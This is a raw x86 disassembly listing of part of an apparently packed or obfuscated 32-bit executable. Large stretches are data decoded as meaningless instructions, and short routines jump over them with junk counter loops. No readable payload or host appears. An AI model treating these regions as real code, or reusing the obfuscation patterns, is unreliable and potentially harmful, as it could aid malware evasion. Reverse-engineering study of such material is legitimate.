  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	adc    DWORD PTR [ebx+0x2547791c],edi
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404a96
  404a98:	in     eax,dx
  404a99:	xor    DWORD PTR [edi],esp
  404a9b:	pop    ecx
  404a9c:	push   0x2858b708
  404aa1:	sbb    BYTE PTR [ebx+0x2b],0x78
  404aa5:	push   ebp
  404aa6:	cli    
  404aa7:	cli    
  404aa8:	pop    eax
  404aa9:	mov    ebp,0xa08d4672
  404aae:	inc    esi
  404aaf:	push   ecx
  404ab0:	call   0x1d41:0xac80cf07
  404ab7:	cmp    eax,ecx
  404ab9:	push   es
  404aba:	in     al,0xc4
  404abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404abd:	push   ebp
  404abe:	fidiv  DWORD PTR [eax-0x1c]
  404ac1:	icebp  
  404ac2:	ja     0x404aa2
  404ac4:	iret   
  404ac5:	xchg   DWORD PTR [edx],ebx
  404ac7:	cmp    BYTE PTR [ebx+edx*4-0xf3cfc3c],bl
  404ace:	inc    edi
  404acf:	mov    ebp,0x96afbf2
  404ad4:	pop    es
  404ad5:	daa    
  404ad6:	mov    ah,BYTE PTR [edi-0x17]
  404ad9:	dec    edx
  404ada:	sbb    eax,0x6dc76d11
  404adf:	inc    edx
  404ae0:	jecxz  0x404ad4
  404ae2:	ror    BYTE PTR [ecx-0x663f1069],0x9c
  404ae9:	mov    WORD PTR [ecx+0x6d],?
  404aec:	data16 adc al,0xe8
  404aef:	call   0x5d5b:0x858b3e17
  404af6:	dec    edx
  404af7:	out    0x49,al
  404af9:	nop
  404afa:	sbb    bh,BYTE PTR [ebx]
  404afc:	cli    
  404afd:	gs je  0x404b48
  404b00:	fwait
  404b01:	unpcklps xmm7,XMMWORD PTR [eax+eiz*4-0x58]
  404b06:	adc    DWORD PTR [ebx+0x0],edi
  404b09:	scas   al,BYTE PTR es:[edi]
  404b0a:	js     0x404ac2
  404b0c:	test   eax,0xe618eb2f
  404b11:	test   eax,0x7807f970
  404b16:	addr16 add ch,ch
  404b19:	sub    eax,0xae5c0afb
  404b1e:	test   DWORD PTR [edi+0x3f],0x79b41b60
  404b25:	pop    eax
  404b26:	stos   BYTE PTR es:[edi],al
  404b27:	in     eax,0x7f
  404b29:	pusha  
  404b2a:	ja     0x404abc
  404b2c:	pop    es
  404b2d:	cli    
  404b2e:	out    dx,eax
  404b2f:	jmp    0x404b19
  404b31:	push   es
  404b32:	popa   
  404b33:	push   cs
  404b34:	dec    edx
  404b35:	imul   edx,DWORD PTR [edx-0x7a0d858e],0x3396d152
  404b3f:	dec    esp
  404b40:	xor    ch,BYTE PTR [edi-0x9]
  404b43:	ds pop edi
  404b45:	inc    esp
  404b46:	gs sbb ebp,esi
  404b49:	xor    DWORD PTR [edx-0x2d],eax
  404b4c:	std    
  404b4d:	xchg   edi,eax
  404b4e:	ret    
  404b4f:	dec    ebp
  404b50:	fimul  WORD PTR [eax-0x79ff28c0]
  404b56:	pop    eax
  404b57:	ret    0xd307
  404b5a:	jnp    0x404bac
  404b5c:	cmp    al,0x5f
  404b5f:	in     eax,0x86
  404b61:	mov    dh,0x96
  404b63:	add    al,0x90
  404b65:	sbb    edi,esp
  404b67:	dec    edi
  404b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b69:	mov    DWORD PTR [edx-0x6821fc61],ebx
  404b6f:	in     eax,0x2
  404b71:	add    al,0xb3
  404b73:	sub    ah,BYTE PTR [edi-0x59a1f6d7]
  404b79:	jge    0x404b3a
  404b7b:	nop
  404b7c:	out    0x71,al
  404b7e:	(bad)  
  404b80:	je     0x404bfb
  404b82:	repz dec ebx
  404b84:	push   0xe56d3d1f
  404b89:	xchg   ch,cl
  404b8b:	cmc    
  404b8c:	jb     0x404b52
  404b8e:	push   ecx
  404b8f:	cs push ebx
  404b91:	cwde   
  404b92:	mov    al,0x86
  404b94:	mov    al,0xd0
  404b96:	pop    ecx
  404b97:	das    
  404b98:	fidivr DWORD PTR [ecx]
  404b9a:	mov    cl,0x41
  404b9c:	cmp    ebx,DWORD PTR [ecx-0x34]
  404b9f:	es xor eax,0x5fda12d1
  404ba5:	in     eax,dx
  404ba6:	fwait
  404ba7:	cmp    eax,ebp
  404ba9:	test   al,0x7d
  404bab:	dec    ecx
  404bac:	clc    
  404bad:	jbe    0x404c24
  404baf:	sti    
  404bb0:	push   eax
  404bb1:	test   DWORD PTR [ebx-0x4b],0x4e935bb9
  404bb8:	sub    ah,BYTE PTR [eax]
  404bba:	jb     0x404c0e
  404bbc:	xchg   DWORD PTR [ecx],esp
  404bbe:	add    eax,0x17b097c2
  404bc3:	je     0x404b55
  404bc5:	cmp    BYTE PTR [eax-0x2a13c367],0x96
  404bcc:	xor    esi,0xfffffffe
  404bcf:	(bad)  
  404bd0:	pop    ebx
  404bd1:	call   0x1d349292
  404bd6:	pop    esp
  404bd7:	clc    
  404bd8:	pop    ebp
  404bd9:	add    BYTE PTR [ebx],al
  404bdb:	pop    ebp
  404bdc:	jne    0x404bae
  404bde:	cmp    ch,cl
  404be0:	pop    ecx
  404be1:	push   edi
  404be2:	inc    eax
  404be3:	outs   dx,BYTE PTR ds:[esi]
  404be4:	std    
  404be5:	mov    WORD PTR [edx+0x63],es
  404be8:	aad    0x78
  404bea:	and    al,0x8
  404bec:	fist   DWORD PTR [ebx]
  404bee:	pop    edx
  404bef:	imul   BYTE PTR [eax+edx*8]
  404bf2:	js     0x404c15
  404bf4:	aaa    
  404bf5:	adc    ch,dh
  404bf7:	out    dx,eax
  404bf8:	test   eax,0x9314c1d4
  404bfd:	ins    DWORD PTR es:[edi],dx
  404bfe:	and    BYTE PTR [eax+0x88a23d5],0x3b
  404c05:	dec    ecx
  404c06:	(bad)  
  404c07:	cli    
  404c08:	sbb    eax,0x66668de4
  404c0d:	test   ecx,eax
  404c0f:	popa   
  404c10:	scas   eax,DWORD PTR es:[edi]
  404c11:	xchg   esi,eax
  404c12:	cs jns 0x404bdf
  404c15:	arpl   WORD PTR [ecx+eiz*2+0x25],dx
  404c19:	jne    0x404bfb
  404c1b:	std    
  404c1c:	push   0x630dfa1a
  404c21:	fstp   DWORD PTR [ecx+0x374aa91c]
  404c27:	sbb    BYTE PTR ds:0xb0da63c8,bh
  404c2d:	lahf   
  404c2e:	test   BYTE PTR [ecx-0x3],bh
  404c31:	(bad)  
  404c32:	pop    es
  404c33:	aaa    
  404c34:	mov    edi,0x9232e358
  404c39:	push   edi
  404c3a:	inc    esi
  404c3b:	xchg   edx,eax
  404c3c:	outs   dx,DWORD PTR ds:[esi]
  404c3d:	dec    ebp
  404c3e:	add    esp,DWORD PTR [ebp-0x5e]
  404c41:	fldenv [eax]
  404c43:	test   BYTE PTR [edi],dl
  404c45:	pop    ds
  404c46:	(bad)  
  404c47:	test   al,0x2f
  404c49:	fs sbb ebx,ebp
  404c4c:	xor    DWORD PTR [esp+edx*4+0x68],edx
  404c50:	call   FWORD PTR [edx+0x4]
  404c53:	in     eax,dx
  404c54:	xchg   ebx,eax
  404c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c56:	fsubrp st(2),st
  404c58:	adc    BYTE PTR [eax],0x77
  404c5b:	push   ebp
  404c5c:	gs jge 0x404cd2
  404c5f:	inc    edi
  404c60:	test   esp,esp
  404c62:	lods   eax,DWORD PTR ds:[esi]
  404c63:	enter  0xcbaa,0x60
  404c67:	xor    BYTE PTR [edi+0x29],cl
  404c6a:	cdq    
  404c6b:	mov    DWORD PTR [edx+0x50fb826c],esp
  404c71:	mov    WORD PTR [ebx+0x3996f41b],cs
  404c77:	sti    
  404c78:	aas    
  404c79:	call   0xd488:0x3ead0fd3
  404c80:	outs   dx,BYTE PTR ds:[esi]
  404c81:	sbb    dh,BYTE PTR [edx+0x7c6631ac]
  404c87:	fdivr  QWORD PTR [esp+ecx*2]
  404c8a:	mov    cl,0x9c
  404c8c:	cmp    eax,0x79a8233b
  404c91:	lea    ecx,[ecx]
  404c93:	add    esp,DWORD PTR ds:0xb0571631
  404c99:	call   FWORD PTR [ecx]
  404c9b:	adc    BYTE PTR [edx],cl
  404c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c9e:	mov    esi,DWORD PTR [ebx]
  404ca0:	mov    dh,0x93
  404ca2:	mov    al,bl
  404ca4:	or     esi,DWORD PTR [esi-0x6009441e]
  404caa:	sbb    al,0xe3
  404cac:	(bad)  
  404cad:	xor    ecx,DWORD PTR [ecx+0x1a]
  404cb0:	in     al,dx
  404cb1:	add    eax,0xead2cdd4
  404cb6:	push   0xffffffd3
  404cb8:	push   ebx
  404cb9:	xchg   BYTE PTR [eax],ch
  404cbb:	(bad)  
  404cbc:	cmp    BYTE PTR [eax],dh
  404cbe:	jns    0x404cf1
  404cc0:	and    edi,edx
  404cc2:	dec    edx
  404cc3:	or     eax,0x9a75cc86
  404cc8:	repnz lea eax,[esi+0x420dab4c]
  404ccf:	(bad)  
  404cd0:	repnz adc ebp,0x26aafd5b
  404cd7:	and    cl,BYTE PTR [ecx+0x5b]
  404cda:	mov    cl,0x31
  404cdc:	cwde   
  404cdd:	jno    0x404c8d
  404cdf:	adc    eax,0xd872e932
  404ce4:	fisub  DWORD PTR [ebp-0x79b22ea9]
  404cea:	jle    0x404d50
  404cec:	es jne 0x404d35
  404cef:	or     DWORD PTR [eax+0x192936ea],ebp
  404cf5:	add    BYTE PTR [edx-0x1bc20443],0x12
  404cfc:	ror    dh,cl
  404cfe:	ret    
  404cff:	mov    al,0x29
  404d01:	or     DWORD PTR [eax-0x291761d],eax
  404d07:	jg     0x404d7b
  404d09:	mov    WORD PTR [ebx],es
  404d0b:	xchg   ecx,eax
  404d0c:	xchg   BYTE PTR [esi],al
  404d0e:	aam    0xe2
  404d10:	jmp    0x6051:0x58e22bf9
  404d17:	scas   al,BYTE PTR es:[edi]
  404d18:	pop    ds
  404d19:	mov    esi,0xd58c73eb
  404d1e:	adc    DWORD PTR [eax],edx
  404d20:	jb     0x404cfe
  404d22:	adc    BYTE PTR [esi+0x57fc729d],0xd1
  404d29:	jle    0x404d16
  404d2b:	add    al,0x25
  404d2d:	cli    
  404d2e:	ficomp WORD PTR [ebx]
  404d30:	mov    ds:0xb866996a,eax
  404d35:	fwait
  404d36:	div    ecx
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x3728e0df
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404dbb
  404d6a:	dec    edi
  404d6b:	jae    0x404d45
  404d6d:	or     esi,DWORD PTR [ecx-0x41]
  404d70:	aas    
  404d71:	push   0x3a90113a
  404d76:	imul   esp,eax,0xffffffb8
  404d79:	mov    ds:0x33d9cdf3,eax
  404d7e:	jb     0x404d5c
  404d80:	pop    es
  404d81:	dec    ebx
  404d82:	pushf  
  404d83:	fisub  DWORD PTR [ecx]
  404d85:	jno    0x404d34
  404d87:	xor    bl,BYTE PTR [edx]
  404d89:	sub    bl,ch
  404d8b:	mov    bl,0x1f
  404d8d:	and    ebp,DWORD PTR [eax+0x22]
  404d90:	add    eax,0xfe67cd29
  404d95:	or     eax,0x57d49e01
  404d9a:	lods   al,BYTE PTR ds:[esi]
  404d9b:	imul   edx,DWORD PTR [ecx],0xffffffb3
  404d9e:	cdq    
  404d9f:	outs   dx,BYTE PTR ds:[esi]
  404da0:	jns    0x404db6
  404da2:	dec    edi
  404da3:	jle    0x404e07
  404da5:	mov    WORD PTR ds:0xdee54f75,?
  404dab:	mov    al,ds:0x5a60895f
  404db0:	cmp    DWORD PTR [ebp+0x48],ebp
  404db3:	push   ds
  404db4:	retf   0xbc9e
  404db7:	pop    ds
  404db8:	lea    ebx,[ecx+ebp*8]
  404dbb:	jnp    0x404dbc
  404dbd:	pop    edi
  404dbe:	inc    ebx
  404dbf:	mov    ch,0x35
  404dc1:	xchg   edx,eax
  404dc2:	push   esi
  404dc3:	sar    DWORD PTR [ebp+0x62],0x20
  404dc7:	clc    
  404dc8:	fst    st(6)
  404dca:	push   cs
  404dcb:	xor    DWORD PTR [ecx],edx
  404dcd:	loopne 0x404e34
  404dcf:	push   ebp
  404dd0:	test   BYTE PTR [edi-0x58092b03],dl
  404dd6:	mov    gs,edi
  404dd8:	push   edi
  404dd9:	mov    ds:0x72396cf0,eax
  404dde:	fild   QWORD PTR [eax+0x59]
  404de1:	sub    DWORD PTR [esi-0xe],edi
  404de4:	int3   
  404de5:	test   al,0x95
  404de7:	popf   
  404de8:	inc    ebx
  404de9:	(bad)  
  404dea:	fimul  DWORD PTR [edi]
  404dec:	int    0xfa
  404dee:	sbb    al,0x7e
  404df0:	dec    ecx
  404df1:	iret   
  404df2:	adc    al,0x5e
  404df4:	lods   al,BYTE PTR ds:[esi]
  404df5:	push   edi
  404df6:	arpl   WORD PTR [ebp+0x77748d37],ax
  404dfc:	(bad)  
  404dfd:	loopne 0x404d9f
  404dff:	lods   al,BYTE PTR ds:[esi]
  404e00:	mov    eax,ds:0x87fa5242
  404e05:	call   0xc5fc9efc
  404e0a:	test   al,0xce
  404e0c:	push   esp
  404e0d:	add    DWORD PTR [eax-0x5],edi
  404e10:	and    al,0xd2
  404e12:	sbb    eax,DWORD PTR [edx+0x5a]
  404e15:	cmp    al,0x86
  404e17:	test   eax,0x98bb949
  404e1c:	hlt    
  404e1d:	stc    
  404e1e:	hlt    
  404e1f:	shl    BYTE PTR [edx+edx*4+0x76579049],0xce
  404e27:	sub    ebx,DWORD PTR [ecx-0x6b253c1b]
  404e2d:	pop    eax
  404e2e:	jmp    0x6276f3d6
  404e33:	adc    ah,BYTE PTR [ecx-0x4c955e69]
  404e39:	ds jl  0x404e25
  404e3c:	leave  
  404e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3e:	cs ds mov bl,0x7f
  404e42:	pop    edi
  404e43:	(bad)
  404e47:	inc    dl
  404e49:	add    BYTE PTR [edi-0x7d],bh
  404e4c:	mov    eax,ds:0xbf61fda2
  404e51:	cmp    ch,BYTE PTR [edx-0x65400453]
  404e57:	jmp    edi
  404e59:	pop    ss
  404e5a:	mov    al,bl
  404e5c:	and    al,0xc6
  404e5e:	cmp    eax,0xd0308a95
  404e63:	popa   
  404e64:	fisttp DWORD PTR gs:[edi+edi*8]
  404e68:	data16 fmul QWORD PTR [ebx-0x23]
  404e6c:	push   ebx
  404e6d:	xlat   BYTE PTR ds:[ebx]
  404e6e:	pop    ebx
  404e6f:	mov    ah,0xa2
  404e71:	es inc edx
  404e73:	enter  0x9a83,0xd1
  404e77:	mov    ah,dh
  404e79:	xchg   ecx,eax
  404e7a:	jg     0x404ef8
  404e7c:	test   DWORD PTR [eax+0x74],esi
  404e7f:	mov    ?,WORD PTR [eax+0x17edaafe]
  404e85:	pop    esi
  404e86:	rol    BYTE PTR [ebp-0x4],cl
  404e89:	and    eax,0x6565aaf
  404e8e:	pop    ecx
  404e8f:	sbb    al,0xbe
  404e91:	adc    esp,DWORD PTR [esi-0x5ebc68d9]
  404e97:	in     al,dx
  404e98:	jb     0x404e4d
  404e9a:	pop    ebp
  404e9b:	xchg   esi,eax
  404e9c:	sub    DWORD PTR [edi+edx*8],edi
  404e9f:	sbb    DWORD PTR [ebp-0x7],ecx
  404ea2:	data16 das 
  404ea4:	mov    al,ds:0x43949e99
  404ea9:	in     al,dx
  404eaa:	jle    0x404ed1
  404eac:	jmp    0x8161:0x1b1c55ab
  404eb3:	pusha  
  404eb4:	ds or  dl,ch
  404eb7:	or     eax,DWORD PTR [ebx+0x59]
  404eba:	xchg   DWORD PTR [edi],ebp
  404ebc:	jl     0x404f22
  404ebe:	sub    ch,bh
  404ec0:	and    ax,0x8447
  404ec4:	leave  
  404ec5:	retf   
  404ec6:	cmp    BYTE PTR [eax+0x58],al
  404ec9:	dec    esp
  404eca:	mov    dh,BYTE PTR [ebp-0xa]
  404ecd:	loopne 0x404eae
  404ecf:	(bad)  
  404ed0:	(bad)  [ebp+0x4531f93d]
  404ed6:	je     0x404f42
  404ed8:	in     al,dx
  404ed9:	xor    ebx,edx
  404edb:	mov    WORD PTR [ebx],?
  404edd:	leave  
  404ede:	xchg   esi,eax
  404edf:	cmp    ebx,DWORD PTR [edx+0x4d]
  404ee2:	pop    ecx
  404ee3:	daa    
  404ee4:	mov    al,0xf5
  404ee6:	and    al,0xca
  404ee8:	jl     0x404efa
  404eea:	int    0xbf
  404eec:	or     al,0x9d
  404eee:	mov    bh,0x63
  404ef0:	adc    bh,bl
  404ef2:	fldenv [ecx-0x2b]
  404ef5:	nop
  404ef6:	fst    DWORD PTR [edx+0x1120b021]
  404efc:	sar    BYTE PTR [esi-0x2e],cl
  404eff:	mul    BYTE PTR [ebx-0x4b]
  404f02:	test   DWORD PTR gs:[edx-0x1aaa8fae],0xd594fcec
  404f0d:	iret   
  404f0e:	inc    ecx
  404f0f:	and    edi,edi
  404f11:	call   FWORD PTR ds:0x7af0028
  404f17:	scas   ax,WORD PTR es:[edi]
  404f19:	inc    DWORD PTR [esi+0x6c]
  404f1c:	pop    esi
  404f1d:	not    BYTE PTR [ebp+0x6270a49f]
  404f23:	rcr    DWORD PTR [ecx-0x48a24e87],1
  404f29:	imul   edi,ecx,0x7c1f5973
  404f2f:	sbb    DWORD PTR [ecx],edx
  404f31:	test   al,0xa9
  404f33:	dec    eax
  404f34:	add    esi,DWORD PTR [ebp+0x2dfc1925]
  404f3a:	test   edx,esp
  404f3c:	out    dx,eax
  404f3d:	outs   dx,BYTE PTR ds:[esi]
  404f3e:	shr    al,0xe5
  404f41:	adc    eax,ecx
  404f43:	jmp    0xe03b:0xe1b1f76e
  404f4a:	rol    cl,1
  404f4c:	lds    ebx,FWORD PTR [ecx-0x1bb0634e]
  404f52:	mov    ss,WORD PTR [ecx+esi*4+0x24]
  404f56:	sub    BYTE PTR [ebx+0x25815135],bh
  404f5c:	fld    DWORD PTR [edx]
  404f5e:	inc    ebx
  404f5f:	add    BYTE PTR [eax],al
  404f61:	add    BYTE PTR [eax],al
  404f63:	add    cl,ch
  404f65:	or     eax,DWORD PTR [eax]
  404f67:	add    BYTE PTR [eax],al
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	lahf   
  405053:	lea    esp,[esi]
  405055:	push   0xffffffd6
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x404ff5
  40505f:	int3   
  405060:	or     BYTE PTR [ebp-0x4],dl
  405063:	mov    fs,WORD PTR [edx-0x27]
  405066:	xchg   ecx,eax
  405067:	xchg   ebp,eax
  405068:	enter  0xb678,0x54
  40506c:	sbb    dh,BYTE PTR [eax+0x22]
  40506f:	inc    esp
  405070:	std    
  405071:	loopne 0x4050df
  405073:	lock lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405076:	outs   dx,DWORD PTR ds:[esi]
  405077:	les    edi,FWORD PTR [ebx-0x15]
  40507a:	cmp    BYTE PTR [ecx],bh
  40507c:	jns    0x4050f3
  40507e:	in     eax,0x36
  405080:	push   edi
  405081:	iret   
  405082:	ror    BYTE PTR [ebx-0x62],cl
  405085:	call   0x8264:0x5f39f91e
  40508c:	push   esp
  40508d:	fwait
  40508e:	adc    dh,BYTE PTR [eax+0x4d]
  405091:	das    
  405092:	pop    ecx
  405093:	scas   eax,DWORD PTR es:[edi]
  405094:	jmp    0x63bdcaae
  405099:	add    BYTE PTR [edx],dh
  40509b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40509c:	xlat   BYTE PTR ds:[ebx]
  40509d:	aas    
  40509e:	push   0x1e
  4050a0:	jb     0x405070
  4050a2:	pop    ebx
  4050a3:	enter  0xb4e4,0xcb
  4050a7:	leave  
  4050a8:	loop   0x405062
  4050aa:	mov    bl,0xeb
  4050ac:	push   0xffffff8c
  4050ae:	adc    DWORD PTR [edx+0x25],edx
  4050b1:	jae    0x405100
  4050b3:	add    DWORD PTR [ecx-0x6b],ebx
  4050b6:	test   BYTE PTR cs:0x105d172d,cl
  4050bd:	js     0x405079
  4050bf:	add    ecx,0x1a839736
  4050c5:	cli    
  4050c6:	in     al,dx
  4050c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050c8:	pop    ds
  4050c9:	fcomp  QWORD PTR [ebp-0x26]
  4050cc:	ins    DWORD PTR es:[edi],dx
  4050cd:	outs   dx,DWORD PTR ds:[esi]
  4050ce:	rcr    BYTE PTR [ecx],0x76
  4050d1:	dec    esp
  4050d2:	div    DWORD PTR [edi+0x68c2cc9]
  4050d8:	sbb    BYTE PTR [eax+0x131bdbb3],ch
  4050de:	pop    eax
  4050df:	xor    esi,ebx
  4050e1:	fcomi  st,st(6)
  4050e3:	or     ebx,DWORD PTR [esi+0x47a9798f]
  4050e9:	sbb    ebp,DWORD PTR [ecx+eiz*8-0x1a]
  4050ed:	sub    al,0x95
  4050ef:	and    dh,BYTE PTR [edi-0x24add36c]
  4050f5:	mov    al,0xa4
  4050f7:	sbb    ah,bh
  4050f9:	je     0x4050b1
  4050fb:	in     eax,0x62
  4050fd:	xchg   DWORD PTR es:[esi],ebp
  405100:	dec    edi
  405101:	repz enter 0x3722,0x7
  405106:	pop    eax
  405107:	sbb    DWORD PTR [ecx-0x3f],esp
  40510a:	xchg   esi,eax
  40510b:	clc    
  40510c:	out    dx,al
  40510d:	int3   
  40510e:	hlt    
  40510f:	pop    esp
  405110:	test   DWORD PTR [ebx],0x97cfc184
  405116:	sub    al,0xa
  405118:	jecxz  0x4050b9
  40511a:	loop   0x4050c3
  40511c:	in     al,0x61
  40511e:	adc    esp,DWORD PTR [eax+edx*4+0x65087c22]
  405125:	imul   DWORD PTR [ebp-0x566b2ca8]
  40512b:	out    dx,al
  40512c:	cdq    
  40512d:	mov    ds:0x3701cf0d,al
  405132:	ins    DWORD PTR es:[edi],dx
  405133:	ror    DWORD PTR [edi],cl
  405135:	icebp  
  405136:	aas    
  405137:	xchg   BYTE PTR [ebx],ch
  405139:	outs   dx,DWORD PTR ds:[esi]
  40513a:	(bad)  
  40513c:	adc    DWORD PTR [ecx+esi*2-0xc8abbe7],edx
  405143:	mov    ds:0xddfb5ce1,al
  405148:	test   bh,bl
  40514a:	(bad)  
  40514b:	aas    
  40514c:	mov    dl,0xe2
  40514e:	pop    esi
  40514f:	push   eax
  405150:	cdq    
  405151:	sbb    esp,DWORD PTR [ebp+0x1d]
  405154:	rol    DWORD PTR [ebx+0x58dac333],0xdc
  40515b:	mov    esp,0x59e784f9
  405160:	xlat   BYTE PTR ds:[ebx]
  405161:	outs   dx,BYTE PTR ds:[esi]
  405162:	adc    al,0x7
  405164:	mov    ax,0x4dbf
  405168:	iret   
  405169:	sbb    BYTE PTR [edi],0x4b
  40516c:	out    0x3,eax
  40516e:	aas    
  40516f:	mov    ds:0x47be86ab,al
  405174:	jmp    0x10d93967
  405179:	fwait
  40517a:	mov    al,ds:0x4604f41c
  40517f:	stc    
  405180:	das    
  405181:	sub    BYTE PTR [eax-0x2d7dcf5a],ch
  405187:	add    edx,DWORD PTR [eax+0x36]
  40518a:	sbb    al,0xa2
  40518c:	mov    ecx,0x34895411
  405191:	ins    BYTE PTR es:[edi],dx
  405192:	add    dl,BYTE PTR [esi+0x58]
  405195:	mov    ecx,0xd8fbf271
  40519a:	xchg   edx,eax
  40519b:	xor    BYTE PTR [esi],ch
  40519d:	xlat   BYTE PTR ds:[ebx]
  40519e:	pop    esp
  40519f:	pop    ebx
  4051a0:	xchg   edi,eax
  4051a1:	jmp    0x581ce6ff
  4051a6:	fisubr WORD PTR [edx-0x7ef24f80]
  4051ac:	push   eax
  4051ad:	scas   eax,DWORD PTR es:[edi]
  4051ae:	leave  
  4051af:	push   eax
  4051b1:	cmp    dh,dl
  4051b3:	(bad)  
  4051b6:	daa    
  4051b7:	xor    DWORD PTR [esi+0x47],ecx
  4051ba:	push   ds
  4051bb:	rol    BYTE PTR [ecx-0x2bc956b1],1
  4051c1:	jae    0x405179
  4051c3:	daa    
  4051c4:	jmp    0x40522a
  4051c6:	xor    bh,BYTE PTR [ebx]
  4051c8:	xlat   BYTE PTR ds:[ebx]
  4051c9:	pop    edx
  4051ca:	das    
  4051cb:	cli    
  4051cc:	lods   al,BYTE PTR ds:[esi]
  4051cd:	mov    WORD PTR [edi+0x67d70c9f],ss
  4051d3:	mov    dl,0x80
  4051d5:	sub    DWORD PTR [edx],ebx
  4051d7:	inc    esi
  4051d8:	dec    edx
  4051d9:	xchg   esp,eax
  4051da:	push   esp
  4051db:	loop   0x405214
  4051dd:	popa   
  4051de:	test   al,0x1d
  4051e0:	inc    esi
  4051e1:	dec    eax
  4051e2:	adc    DWORD PTR [eax+0x12],ecx
  4051e5:	add    eax,0xb38d2796
  4051ea:	imul   edi,DWORD PTR [ebx],0xfffffff7
  4051ed:	bound  esi,QWORD PTR [ecx+0x21e7bf75]
  4051f3:	mov    ch,0xd7
  4051f5:	pop    ds
